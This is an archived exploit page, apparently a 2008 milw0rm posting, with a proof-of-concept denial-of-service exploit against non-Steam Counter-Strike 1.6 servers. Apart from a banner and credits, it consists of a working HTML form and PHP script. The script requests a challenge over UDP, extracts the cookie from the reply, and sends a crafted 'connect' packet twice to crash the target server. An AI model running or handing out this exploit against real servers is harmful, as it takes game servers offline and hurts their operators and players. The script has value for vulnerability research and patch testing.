<html><head><title>Half-Life CSTRIKE Server 1.6 Denial of Service Exploit (no-steam)</title></head><pre>----[  Counter Strike 1.6 Denial Of Service POC ... ITDefence.ru Antichat.ru ]

							Counter Strike 1.6 Denial Of Service POC
								Eugene Minaev underwater@itdefence.ru
							Bug was found by Maxim Suhanov ( THE FUF )
								works only with no-steam servers
				___________________________________________________________________
			____/  __ __ _______________________ _______  _______________    \  \   \
			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
			/ /     /_//              /\        /       /      /         /     /___/
			\/        /              / /       /       /\     /         /         /
			/        /               \/       /       / /    /         /__       //\
			\       /    ____________/       /        \/    __________// /__    // /   
			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
			\ \\                                                               // // /
			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
			. \_\\________[________________________________________]_________//_//_/ . .
		
		&lt;html&gt;
		&lt;head&gt;
		&lt;title&gt;Counter Strike DOS POC (underwater@itdefence.ru) &lt;/title&gt;

		&lt;style type=&quot;text/css&quot;&gt;

		input {
		width: 150px;
		}

		td {
		font-size: 12px;
		font-family: Verdana, &quot;Trebuchet MS&quot;;
		text-align: left;
		}

		span.err {
		color: red;
		}

		span.ok {
		color: green;
		}

		&lt;/style&gt;

		&lt;/head&gt;

		&lt;body onload=&quot;checkpass()&quot;&gt;

		&lt;div style=&quot;width: 210px; margin: auto;&quot;&gt;
		&lt;form name=&quot;csform&quot; method=&quot;post&quot; action=&quot;cs.php&quot;&gt;

		&lt;table border=&quot;1&quot; align=&quot;center&quot; cellpadding=&quot;2&quot; cellspacing=&quot;0&quot; style=&quot;width: 100%;&quot;&gt;
		&lt;tr&gt;
		&lt;td style=&quot;width: 50px;&quot;&gt;Host&lt;/td&gt;
		&lt;td colspan=&quot;2&quot;&gt;&lt;input name=&quot;host&quot; type=&quot;text&quot; value=&quot;&quot;/&gt;&lt;/td&gt;
		&lt;/tr&gt;

		&lt;tr&gt;
		&lt;td&gt;Port&lt;/td&gt;
		&lt;td colspan=&quot;2&quot;&gt;&lt;input name=&quot;port&quot; type=&quot;text&quot; value=&quot;&quot;/&gt;&lt;/td&gt;
		&lt;/tr&gt;

		&lt;tr&gt;
		&lt;td&gt;&amp;nbsp;&lt;/td&gt;
		&lt;td&gt;&lt;input name=&quot;auth&quot; type=&quot;checkbox&quot; value=&quot;&quot; style=&quot;width: 30px;&quot;/&gt;&lt;/td&gt;
		&lt;td&gt;Auth Type 2&lt;/td&gt;
		&lt;/tr&gt;

		&lt;tr&gt;
		&lt;td&gt;Pass&lt;/td&gt;
		&lt;td colspan=&quot;2&quot;&gt;&lt;input name=&quot;pass&quot; type=&quot;text&quot; value=&quot;&quot; /&gt;&lt;/td&gt;
		&lt;/tr&gt;


		&lt;tr&gt;
		&lt;td&gt;&amp;nbsp;&lt;/td&gt;
		&lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;submit&quot; Value=&quot;Run&quot;/&gt;&lt;/td&gt;
		&lt;/tr&gt;


		&lt;/table&gt; 
		&lt;br/&gt;
		&lt;/form&gt;
		&lt;/div&gt;
		&lt;center&gt;ITDEFENCE / RUSSIA (http://itdefence.ru)&lt;br&gt;
		&lt;/body&gt;
		&lt;/html&gt;

		&lt;?php

		/*
		CS-dos exploit made by underwater 
		Bug was discovered by .FUF  
		Big respect 2 Sax-mmS ( for html ) , Focs ( for his cs server [IMG]http://www.softoplanet.ru/style_emoticons/default/biggrin.gif[/IMG] ) , SkvoznoY , Bug(O)R,Antichat.ru and Cup.su
		*/

		ini_set(&quot;display_errors&quot;,&quot;0&quot;);

		function HELLO_PACKET()
		{
		$packet = pack(&quot;H*&quot;,&quot;FFFFFFFF&quot;);
		$packet .= &quot;TSource Engine Query&quot;;
		$packet .= pack(&quot;H*&quot;,&quot;00&quot;);
		return $packet;
		}

		function CHALLENGE_PACKET()
		{
		$packet = pack(&quot;H*&quot;,&quot;FFFFFFFF&quot;);
		$packet .= &quot;getchallenge valve&quot;;
		$packet .= pack(&quot;H*&quot;,&quot;00&quot;);
		return $packet;
		}

		function LOGIN_PACKET_4()
		{
		global $cookie;
		global $password;
		$packet = pack(&quot;H*&quot;,&quot;FFFFFFFF&quot;);
		$packet .= &quot;connect 47 &quot;;
		$packet .= $cookie.' &quot;';
		$packet .= '\prot\4\unique\-1\raw\valve\cdkey\d506d189cf551620a70277a3d2c55bb2&quot; &quot;';
		$packet .= '\_cl_autowepswitch\1\bottomcolor\6\cl_dlmax\128\cl_lc\1\cl_lw\1\cl_updaterate\30\mod';
		$packet .= 'el\gordon\name\Born to be pig (..)\topcolor\30\_vgui_menus\1\_ah\1\rate\3500\*fid\0\pass';
		$packet .= 'word\\'.$password;
		$packet .= pack(&quot;H*&quot;,&quot;220A0000EE02&quot;);
		return $packet;
		}

		function LOGIN_PACKET_2()
		{
		global $cookie;
		global $password;
		$packet = pack(&quot;H*&quot;,&quot;FFFFFFFF&quot;);
		$packet .= &quot;connect 47 &quot;;
		$packet .= $cookie.' &quot;';
		$packet .= '\prot\2\raw\d506d189cf551620a70277a3d2c55bb2&quot; &quot;\_cl_autowepswitch\1\bott';
		$packet .= 'omcolor\6\cl_dlmax\128\cl_lc\1\cl_lw\1\cl_updaterate\30\model\gordon\nam';
		$packet .= 'e\Born to be pig (..)\topcolor\30\_vgui_menus\1\_ah\1\rate\3500\*fid\0\pass';
		$packet .= 'word\\'.$password;
		$packet .= pack(&quot;H*&quot;,&quot;22&quot;);
		return $packet;
		}

		function dowork($host,$port,$password,$auth)
		{
		global $password;
		global $cookie;
		# connecting to target host
		$fsock = fsockopen(&quot;udp://&quot;.$host,(int) $port,$errnum,$errstr,2);
		if (!$fsock) die ($errstr);
		else 
		{
		# sending hello packet
		fwrite ($fsock,HELLO_PACKET());
		fread ($fsock,100);
		# sending chalennge packet
		fwrite ($fsock,CHALLENGE_PACKET());
		# recieving cookies
		$resp = fread($fsock,100);
		# grab cookies from packet
		$cookie = substr($resp,strpos($resp,&quot;A00000000&quot;)+10);
		$cookie = substr($cookie,0,strpos($cookie,&quot; &quot;));
		# sending login packet
		if (!$auth) fwrite ( $fsock,LOGIN_PACKET_4());else fwrite ( $fsock,LOGIN_PACKET_2());
		$resp = fread($fsock,100);
		}
		}

		IF (isset($_POST['host']) &amp;&amp; isset($_POST['port']))
		{
		IF (empty($_POST['pass'])) $password = &quot;123&quot;;
		else $password = $_POST['pass'];
		$fserver = $_POST['host'];
		$fport = $_POST['port'];
		if (isset($_POST['auth'])) $fauth = true;else $fauth=false;
		# we have to connect 2 times
		$result = dowork($fserver,$fport,$password,$fauth);
		$result = dowork($fserver,$fport,$password,$fauth);
		# parsing result
		echo &quot;Exploit Sent&quot;;
		}
		?&gt;

----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]

# milw0rm.com [2008-01-06]</pre></html>